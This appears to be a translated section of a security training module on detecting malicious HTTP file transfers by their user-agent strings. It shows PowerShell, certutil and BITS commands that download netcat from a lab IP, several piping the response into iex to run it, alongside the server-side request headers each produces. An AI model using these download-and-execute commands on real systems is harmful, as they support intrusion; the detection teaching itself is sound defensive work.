# Detección

La detección de la línea de comandos basada en la lista negra es sencilla para omitir, incluso utilizando una simple ofuscación de casos. Sin embargo, aunque el proceso de la lista blanca de todas las líneas de comando en un entorno particular es inicialmente lento, es muy robusto y permite una detección rápida y alerta en cualquier línea de comando inusual.

La mayoría de los protocolos de cliente cliente requieren que el cliente y el servidor negocien cómo se entregará el contenido antes de intercambiar información. Esto es común con el`HTTP`protocolo. Existe la necesidad de interoperabilidad entre diferentes servidores web y tipos de navegadores web para garantizar que los usuarios tengan la misma experiencia sin importar su navegador. Los clientes HTTP son reconocidos más fácilmente por su cadena de agente de usuario, que el servidor utiliza para identificar qué`HTTP`El cliente se está conectando, por ejemplo, Firefox, Chrome, etc.

Los agentes de los usuarios no solo se usan para identificar los navegadores web, sino cualquier cosa que actúe como un`HTTP`cliente y conectarse a un servidor web a través de`HTTP`puede tener una cadena de agente de usuario (es decir,`cURL`, una costumbre`Python`script, o herramientas comunes como`sqlmap`, o`Nmap`).

Las organizaciones pueden tomar algunos pasos para identificar posibles cadenas de agentes de usuarios mediante la creación de una lista de una lista de cadenas de agentes de usuarios legítimos conocidos, agentes de usuarios utilizados por procesos de sistema operativo predeterminado, agentes de usuario comunes utilizados por los servicios de actualización como la actualización de Windows y las actualizaciones antivirus, etc. Estos pueden alimentarse en una herramienta de SIEM para la caza de amenazas para filtrar el tráfico legítimo y el enfoque en anomalías que pueden indicar un comportamiento suspendido. Cualquier cadena de agente de usuario de aspecto sospechoso puede investigarse más a fondo para determinar si se usaron para realizar acciones maliciosas. Este[sitio web](http://useragentstring.com/index.php)es útil para identificar cadenas comunes de agentes de usuarios. Una lista de cadenas de agentes de usuario está disponible[aquí](http://useragentstring.com/pages/useragentstring.php).

Las transferencias de archivos maliciosos también pueden ser detectadas por sus agentes de usuario. Los siguientes agentes/encabezados de los usuarios se observaron desde el común`HTTP`Técnicas de transferencia (probadas en Windows 10, versión 10.0.14393, con PowerShell 5).

### **Invoke -WebRequest - Cliente**

Detección

```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

```

### **Invoke -WebRequest - servidor**

Detección

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

```

### **Winhttprequest - Cliente**

Detección

```powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.ResponseText
```

### **Winhttprequest - servidor**

Detección

```
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

```

### **Msxml2 - cliente**

Detección

```powershell
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.responseText
```

### **Msxml2 - servidor**

Detección

```
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

```

### **Certutil - Cliente**

Detección

```
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

```

### **Certutil - servidor**

Detección

```
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0

```

### **Bits - cliente**

Detección

```powershell
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;PS C:\htb> $r=gc $env:temp\t;PS C:\htb> rm $env:temp\t; PS C:\htb> iex $r
```

### **Bits - servidor**

Detección

```
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8

```

This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.